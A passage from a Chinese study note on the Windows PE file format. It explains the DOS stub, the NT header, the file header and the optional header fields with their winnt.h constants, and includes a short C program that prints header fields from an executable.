src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC13%E7%AB%A0%20PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F.assets/image-20211203224614355.png" alt="image-20211203224614355"></p><p>对汇编代码的解释参考书：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC13%E7%AB%A0%20PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F.assets/image-20211203224855360.png" alt="image-20211203224855360"></p><p>代码非常简单，在画面中输岀字符串“This program cannot be run in DOS mode”后就退出。<br>换言之，notepad.exe文件虽然是32位的PE文件，但是带有MS-DOS兼容模式，可以在DOS环境中运行，执行DOS EXE代码，输出“This program cannot be run in DOS mode”后终止。灵活使用该特性可以在一个可执行文件（EXE）中创建岀另一个文件，它在DOS与Windows中都能运行（在DOS环境中运行16位DOS代码，在Windows环境中运行32位Windows代码）。</p><p>如前所述，DOS存根是可选项，开发工具应该支持它（VB、VC++、Delphi等默认支持DOS存根）</p><h2 id="13-3-3-NT头"><a href="#13-3-3-NT头" class="headerlink" title="13.3.3 NT头"></a>13.3.3 NT头</h2><p>NT头结构体如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_NT_HEADERS</span> &#123;</span><br>    DWORD Signature;<br>    IMAGE_FILE_HEADER FileHeader;<br>    IMAGE_OPTIONAL_HEADER32 OptionalHeader;<br>&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;<br></code></pre></td></tr></table></figure><p>IMAGE_NT_HEADERS结构体由3个成员组成，第一个成员为签名（Signature ）结构体，其值为50450000h（ “PE” 00 ）。另外两个成员分别为文件头（File Header）与可选头（ Optional Header）结构体。使用Hex Editor打开notepad.exe，查看IMAGE_NT_HEADERS，如下图所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC13%E7%AB%A0%20PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F.assets/image-20211204094323666.png" alt="image-20211204094323666"></p><p>IMAGE_NT_HEADERS结构体的大小为F8，相当大。下面分别讲解文件头与可选头结构体。</p><h2 id="13-3-4-NT头：文件头"><a href="#13-3-4-NT头：文件头" class="headerlink" title="13.3.4 NT头：文件头"></a>13.3.4 NT头：文件头</h2><h3 id="IMAGE-FILE-HEADER"><a href="#IMAGE-FILE-HEADER" class="headerlink" title="IMAGE_FILE_HEADER"></a>IMAGE_FILE_HEADER</h3><p>文件头是表现文件大致属性的结构体。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_FILE_HEADER</span> &#123;</span><br>    WORD    Machine;<br>    WORD    NumberOfSections;<br>    DWORD   TimeDateStamp;<br>    DWORD   PointerToSymbolTable;<br>    DWORD   NumberOfSymbols;<br>    WORD    SizeOfOptionalHeader;<br>    WORD    Characteristics;<br>&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;<br></code></pre></td></tr></table></figure><p>IMAGE_FILE_HEADERS结构体中有如下4种重要成员（若它们设置不正确，将导致文件无法正常运行）。</p><h4 id="Machine"><a href="#Machine" class="headerlink" title="Machine"></a>Machine</h4><p>每个CPU都拥有唯一的Machine码，兼容32位Intel x86芯片的Machine码为14C。以下是定义在winnt.h文件中的Machine码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_MACHINE_UNKNOWN           0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_MACHINE_TARGET_HOST       0x0001  <span class="hljs-comment">// Useful for indicating we want to interact with the host and not a WoW guest.</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_MACHINE_I386              0x014c  <span class="hljs-comment">// Intel 386.</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_MACHINE_R3000             0x0162  <span class="hljs-comment">// MIPS little-endian, 0x160 big-endian</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_MACHINE_R4000             0x0166  <span class="hljs-comment">// MIPS little-endian</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_MACHINE_R10000            0x0168  <span class="hljs-comment">// MIPS little-endian</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_MACHINE_WCEMIPSV2         0x0169  <span class="hljs-comment">// MIPS little-endian WCE v2</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_MACHINE_ALPHA             0x0184  <span class="hljs-comment">// Alpha_AXP</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_MACHINE_SH3               0x01a2  <span class="hljs-comment">// SH3 little-endian</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_MACHINE_SH3DSP            0x01a3</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_MACHINE_SH3E              0x01a4  <span class="hljs-comment">// SH3E little-endian</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_MACHINE_SH4               0x01a6  <span class="hljs-comment">// SH4 little-endian</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_MACHINE_SH5               0x01a8  <span class="hljs-comment">// SH5</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_MACHINE_ARM               0x01c0  <span class="hljs-comment">// ARM Little-Endian</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_MACHINE_THUMB             0x01c2  <span class="hljs-comment">// ARM Thumb/Thumb-2 Little-Endian</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_MACHINE_ARMNT             0x01c4  <span class="hljs-comment">// ARM Thumb-2 Little-Endian</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_MACHINE_AM33              0x01d3</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_MACHINE_POWERPC           0x01F0  <span class="hljs-comment">// IBM PowerPC Little-Endian</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_MACHINE_POWERPCFP         0x01f1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_MACHINE_IA64              0x0200  <span class="hljs-comment">// Intel 64</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_MACHINE_MIPS16            0x0266  <span class="hljs-comment">// MIPS</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_MACHINE_ALPHA64           0x0284  <span class="hljs-comment">// ALPHA64</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_MACHINE_MIPSFPU           0x0366  <span class="hljs-comment">// MIPS</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_MACHINE_MIPSFPU16         0x0466  <span class="hljs-comment">// MIPS</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_MACHINE_AXP64             IMAGE_FILE_MACHINE_ALPHA64</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_MACHINE_TRICORE           0x0520  <span class="hljs-comment">// Infineon</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_MACHINE_CEF               0x0CEF</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_MACHINE_EBC               0x0EBC  <span class="hljs-comment">// EFI Byte Code</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_MACHINE_AMD64             0x8664  <span class="hljs-comment">// AMD64 (K8)</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_MACHINE_M32R              0x9041  <span class="hljs-comment">// M32R little-endian</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_MACHINE_ARM64             0xAA64  <span class="hljs-comment">// ARM64 Little-Endian</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_MACHINE_CEE               0xC0EE</span><br></code></pre></td></tr></table></figure><h4 id="NumberOfSections"><a href="#NumberOfSections" class="headerlink" title="NumberOfSections"></a>NumberOfSections</h4><p>​前面提到过，PE文件把代码、数据、资源等依据属性分类到各节区中存储。<br>​<code>NumberOfSections</code>用来指出文件中存在的节区数量。该值一定要大于0，且当定义的节区数量与实际节区不同时，将发生运行错误。</p><h4 id="TimeDateStamp"><a href="#TimeDateStamp" class="headerlink" title="TimeDateStamp"></a>TimeDateStamp</h4><p>​该PE文件生成的时间。该成员的值不影响文件运行，用 来记录编译器创建此文件的时间。但是有些开发工具（VB、VC++)提供了设置该值的工具，而有些开发工具（Delphi)则未提供（且随所用选项的不同而不同）。</p><h4 id="PointerToSymbolTable"><a href="#PointerToSymbolTable" class="headerlink" title="PointerToSymbolTable"></a>PointerToSymbolTable</h4><p>这个已经逐渐弃用了，这里不再介绍。</p><h4 id="NumberOfSymbols"><a href="#NumberOfSymbols" class="headerlink" title="NumberOfSymbols"></a>NumberOfSymbols</h4><p>这个已经逐渐弃用了，这里不再介绍。</p><h4 id="SizeOfOptionalHeader"><a href="#SizeOfOptionalHeader" class="headerlink" title="SizeOfOptionalHeader"></a>SizeOfOptionalHeader</h4><p>​<code>IMAGE_NT_HEADER</code>结构体的最后一个成员为<code>IMAGE_OPTIONAL_HEADER32</code>结构体。<code>SizeOfOptionalHeader</code>成员用来指岀 <code>IMAGE_OPTIONAL_HEADER32</code>结构体的长度。<code>IMAGE_OPTIONAL_HJEADER32</code>结构体由C语言编写而成，故其大小已经确定。但是Windows的PE装载器需要查看<code>IMAGE_FILE_HEADER</code>的<code>SizeOfOptionalHeader</code>值，从而识别出<code>MAGE_OPTIONAL_HEADER32</code>结构体的大小。</p><p>​PE32+格式的文件中使用的是<code>IMAGE_OPTIONAL_HEADER64</code>结构体，而不是<code>IMAGE_OPTIONAL_HEADER32</code>结构体。2个结构体的尺寸是不同的，所以需要在<code>SizeOfOptionaUieader</code>成员中明确指出结构体的大小。</p><blockquote><p>借助 IMAGE_DOS_HEADER 的 ejfanew 成员与 IMAGE_FILE_HEADER 的SizeOfOptionalHeader成员，可以创建出一种脱离常规的PE文件（PE Patch )(也有入称之为“麻花” PE文件）。</p></blockquote><h4 id="Characteristics"><a href="#Characteristics" class="headerlink" title="Characteristics"></a>Characteristics</h4><p>​该字段用于标识文件的属性，文件是否是可运行的形态、是否为DLL文件等信息，以bit OR形式组合起来。以下是定义在winnt.h文件中的（请记住0002h与2000h这两个值)。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_RELOCS_STRIPPED           0x0001  <span class="hljs-comment">// Relocation info stripped from file.</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_EXECUTABLE_IMAGE          0x0002  <span class="hljs-comment">// File is executable  (i.e. no unresolved external references).</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_LINE_NUMS_STRIPPED        0x0004  <span class="hljs-comment">// Line nunbers stripped from file.</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_LOCAL_SYMS_STRIPPED       0x0008  <span class="hljs-comment">// Local symbols stripped from file.</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_AGGRESIVE_WS_TRIM         0x0010  <span class="hljs-comment">// Aggressively trim working set</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_LARGE_ADDRESS_AWARE       0x0020  <span class="hljs-comment">// App can handle &gt;2gb addresses</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_BYTES_REVERSED_LO         0x0080  <span class="hljs-comment">// Bytes of machine word are reversed.</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_32BIT_MACHINE             0x0100  <span class="hljs-comment">// 32 bit word machine.</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_DEBUG_STRIPPED            0x0200  <span class="hljs-comment">// Debugging info stripped from file in .DBG file</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_REMOVABLE_RUN_FROM_SWAP   0x0400  <span class="hljs-comment">// If Image is on removable media, copy and run from the swap file.</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_NET_RUN_FROM_SWAP         0x0800  <span class="hljs-comment">// If Image is on Net, copy and run from the swap file.</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_SYSTEM                    0x1000  <span class="hljs-comment">// System File.</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_DLL                       0x2000  <span class="hljs-comment">// File is a DLL.</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_UP_SYSTEM_ONLY            0x4000  <span class="hljs-comment">// File should only be run on a UP machine</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_FILE_BYTES_REVERSED_HI         0x8000  <span class="hljs-comment">// Bytes of machine word are reversed.</span></span><br></code></pre></td></tr></table></figure><p>​另外，PE文件中Characteristics的值有可能不是0002h吗（不可执行）？是的，确实存在这种情况。比如类似*.obj的object文件及resource DLL文件等。</p><h3 id="自实现代码解析-1"><a href="#自实现代码解析-1" class="headerlink" title="自实现代码解析"></a>自实现代码解析</h3><p>编写如下代码对PE文件的FileHeader进行分析：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    FILE* pFile = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">char</span>* buffer;<br>    <span class="hljs-type">int</span> nFileLength = <span class="hljs-number">0</span>;<br>    pFile = fopen(<span class="hljs-string">&quot;C:\\Users\\shinelon\\Desktop\\Caesium.exe&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>);<br>    fseek(pFile, <span class="hljs-number">0</span>, SEEK_END); <span class="hljs-comment">// 将文件位置指针定位到文件结尾，从SEEK_END开始，偏移0个字节</span><br>    nFileLength = ftell(pFile); <span class="hljs-comment">//返回当前文件位置指针相对于文件开始的距离，在这里就是文件的大小</span><br>    rewind(pFile); <span class="hljs-comment">//将文件位置指针倒回文件开始</span><br>    <span class="hljs-type">int</span> imageLength = nFileLength * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">char</span>) + <span class="hljs-number">1</span>;<br>    buffer = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(imageLength);<br>    <span class="hljs-built_in">memset</span>(buffer, <span class="hljs-number">0</span>, imageLength);<br>    fread(buffer, <span class="hljs-number">1</span>, imageLength, pFile);<br><br>    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)buffer;<br>    PIMAGE_NT_HEADERS  pNtHeaders = (PIMAGE_NT_HEADERS)(buffer + pDosHeader-&gt;e_lfanew);<br>    PIMAGE_FILE_HEADER pfileHeader = &amp;(pNtHeaders-&gt;FileHeader);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%x&quot;</span>, pfileHeader-&gt;Machine);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%x&quot;</span>, pfileHeader-&gt;NumberOfSections);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%x&quot;</span>, pfileHeader-&gt;Characteristics);<br><br><br>    <span class="hljs-built_in">free</span>(buffer);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="13-3-5-NT头：可选头"><a href="#13-3-5-NT头：可选头" class="headerlink" title="13.3.5 NT头：可选头"></a>13.3.5 NT头：可选头</h2><p>表面上有的头是Optional的，实际上它是最大也是最为重要的一个PE结构。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Directory format.</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_DATA_DIRECTORY</span> &#123;</span><br>    DWORD   VirtualAddress;<br>    DWORD   Size;<br>&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_NUMBEROF_DIRECTORY_ENTRIES    16</span><br><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Optional header format.</span><br><span class="hljs-comment">//</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_OPTIONAL_HEADER</span> &#123;</span><br>    <span class="hljs-comment">//</span><br>    <span class="hljs-comment">// Standard fields.</span><br>    <span class="hljs-comment">//</span><br><br>    WORD    Magic;<br>    BYTE    MajorLinkerVersion;<br>    BYTE    MinorLinkerVersion;<br>    DWORD   SizeOfCode;<br>    DWORD   SizeOfInitializedData;<br>    DWORD   SizeOfUninitializedData;<br>    DWORD   AddressOfEntryPoint;<br>    DWORD   BaseOfCode;<br>    DWORD   BaseOfData;<br><br>    <span class="hljs-comment">//</span><br>    <span class="hljs-comment">// NT additional fields.</span><br>    <span class="hljs-comment">//</span><br><br>    DWORD   ImageBase;<br>    DWORD   SectionAlignment;<br>    DWORD   FileAlignment;<br>    WORD    MajorOperatingSystemVersion;<br>    WORD    MinorOperatingSystemVersion;<br>    WORD    MajorImageVersion;<br>    WORD    MinorImageVersion;<br>    WORD    MajorSubsystemVersion;<br>    WORD    MinorSubsystemVersion;<br>    DWORD   Win32VersionValue;<br>    DWORD   SizeOfImage;<br>    DWORD   SizeOfHeaders;<br>    DWORD   CheckSum;<br>    WORD    Subsystem;<br>    WORD    DllCharacteristics;<br>    DWORD   SizeOfStackReserve;<br>    DWORD   SizeOfStackCommit;<br>    DWORD   SizeOfHeapReserve;<br>    DWORD   SizeOfHeapCommit;<br>    DWORD   LoaderFlags;<br>    DWORD   NumberOfRvaAndSizes;<br>    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];<br>&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;<br></code></pre></td></tr></table></figure><p>在IMAGE_OPTIONAL_HEADER32结构体中需要关注下列成员。这些值是文件运行必需的，设置错误将导致文件无法正常运行。</p><ol><li><p>Magic<br>为IMAGE_OPTIONAL_HEADER32结构体时，Magic码为 10B ;为 IMAGE_OPTIONAL_HEADER64结构体时，Magic码为20B。</p></li><li><p>AddressOfEntryPoint<br>AddressOffEntryPoint持有EP的RVA值。该值指出程序最先执行的代码起始地址，相当重要。</p></li><li><p>ImageBase<br>进程虚拟内存的范围是0〜FFFFFFFF （32位系统）。PE文件被加载到如此大的内存中时，ImageBase指出文件的优先装入地址。EXE、DLL文件被装载到用户内存的0〜7FFFFFFF中，SYS文件被载入内核内存的80000000〜FFFFFFFF中。一般而言，使用开发工具（VB&#x2F;VO+&#x2F;Delphi）创建好EXE文件后，其ImageBase的值为00400000, DLL文件的ImageBase值为10000000 (当然也可以指定为其他值）。执行PE文件时，PE装载器先创建进程，再将文件载入内存，然后把EIP寄存器的值设置为ImageBase+AddressOfEntryPoint。</p></li><li><p>SectionAlignment,FileAlignment<br>PE文件的Body部分划分为若干节区，这些节存储着不同类别的数据。FileAlignment指定了节区在磁盘文件中的最小单位，而SectionAlignment则指定了节区在内存中的最小单位（一个文件中，FileAlignment与SectionAlignment的值可能相同，也可能不同）。磁盘文件或内存的节区大小必定为FileAlignment或SectionAlignment值的整数倍。</p></li><li><p>SizeOfImage<br>加载PE文件到内存时，SizeOfImage指定了PE Image在虚拟内存中所#占空间的大小。一般而言，文件的大小与加载到内存中的大小是不同的（节区头中定义了各节装载的位置与占有内存的大小，后面会讲到）。 </p></li><li><p>SizeOfHeader<br>SizeOfHeader用来指出整个PE头的大小。该值也必须是FileAlignment的整数倍。第一节区所在位置与SizeOfHeader距文件开始偏移的量相同。</p></li><li><p>Subsystem<br>该Subsystem值用来区分系统驱动文件（*.sys )与普通的可执行文件（*.exe, *.dll）。 Subsystem成员可拥有的值如表13-2所示（部分）。</p></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_SUBSYSTEM_UNKNOWN              0   <span class="hljs-comment">// Unknown subsystem.</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_SUBSYSTEM_NATIVE               1   <span class="hljs-comment">// Image doesn&#x27;t require a subsystem. 通常为驱动文件</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_SUBSYSTEM_WINDOWS_GUI          2   <span class="hljs-comment">// Image runs in the Windows GUI subsystem. 窗口应用程序</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_SUBSYSTEM_WINDOWS_CUI          3   <span class="hljs-comment">// Image runs in the Windows character subsystem. 控制台应用程序</span></span><br></code></pre></td></tr></table></figure><ol start="8"><li><p>NumberOfRvaAndSizes<br>NumberOfRvaAndSizes 用来指定DataDirectory（IMAGE_OPTIONAL_HEADER32结构体的最后一个成员）数组的个数。虽然结构体定义中明确指出了数组个数为IMAGE_NUMBEROF_DIRECTORY_ENTRIES(16),但是PE装载器通过查看NumberOfRvaAndSizes值来识别数组大小，换言之，数组大小也可能不是16。</p></li><li><p>DataDirectory<br>DataDirectory是由IMAGE_DATA_DIRECTORY结构体组成的数组，数组的每项都有被定义的值。如下列出了各数组项</p></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Directory Entries</span><br><span class="hljs-comment">// 标*的是我们重点需要关注的内容，其他的了解一下即可</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_DIRECTORY_ENTRY_EXPORT          0   <span class="hljs-comment">// Export Directory*  </span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_DIRECTORY_ENTRY_IMPORT          1   <span class="hljs-comment">// Import Directory*</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_DIRECTORY_ENTRY_RESOURCE        2   <span class="hljs-comment">// Resource Directory*</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_DIRECTORY_ENTRY_EXCEPTION       3   <span class="hljs-comment">// Exception Directory</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_DIRECTORY_ENTRY_SECURITY        4   <span class="hljs-comment">// Security Directory</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_DIRECTORY_ENTRY_BASERELOC       5   <span class="hljs-comment">// Base Relocation Table</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_DIRECTORY_ENTRY_DEBUG           6   <span class="hljs-comment">// Debug Directory</span></span><br><span class="hljs-comment">//      IMAGE_DIRECTORY_ENTRY_COPYRIGHT       7   // (X86 usage)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_DIRECTORY_ENTRY_ARCHITECTURE    7   <span class="hljs-comment">// Architecture Specific Data</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_DIRECTORY_ENTRY_GLOBALPTR       8   <span class="hljs-comment">// RVA of GP</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_DIRECTORY_ENTRY_TLS             9   <span class="hljs-comment">// TLS Directory*</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG    10   <span class="hljs-comment">// Load Configuration Directory</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT   11   <span class="hljs-comment">// Bound Import Directory in headers</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_DIRECTORY_ENTRY_IAT            12   <span class="hljs-comment">// Import Address Table</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT   13   <span class="hljs-comment">// Delay Load Import Descriptors</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR 14   <span class="hljs-comment">// COM Runtime descriptor</span></span><br></code></pre></td></tr></table></figure><p>如下是notepad.exe的IMAGE_OPTIONAL_HEADER结构体。</p><p><img 